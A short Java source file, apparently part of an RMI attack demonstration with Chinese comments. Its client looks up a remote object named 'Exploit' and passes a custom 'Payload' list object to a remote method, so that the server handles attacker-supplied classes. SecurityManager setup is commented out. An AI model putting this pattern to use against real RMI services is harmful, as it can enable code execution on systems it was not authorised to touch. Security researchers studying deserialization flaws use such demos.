import java.io.Serializable;
import java.rmi.Naming;
import java.util.ArrayList;
import java.util.List;

/**
 * RMIClient 实现主类，继承 Serializable
 */

public class RMIClient implements Serializable {
    public void lookup() throws Exception {
        // RMIServer 的地址
        Calc r = (Calc) Naming.lookup("rmi://192.168.3.10:1099/Exploit");

        List<Integer> list = new Payload();
        list.add(3);
        list.add(4);
        System.out.println(Payload.class.getClassLoader().getResource("").getPath());
        System.out.println("remote function result is: " + r.sum(list));
    }

    public static void main(String[] args) throws Exception {
//        if (null == System.getSecurityManager()) {
//            System.out.println("Setup SecurityManager...");
//            SecurityManager sm = new SecurityManager();
//            System.setSecurityManager(sm);
//            System.out.println("SecurityManager is: " + sm );
//        }

        new RMIClient().lookup();
    }
}
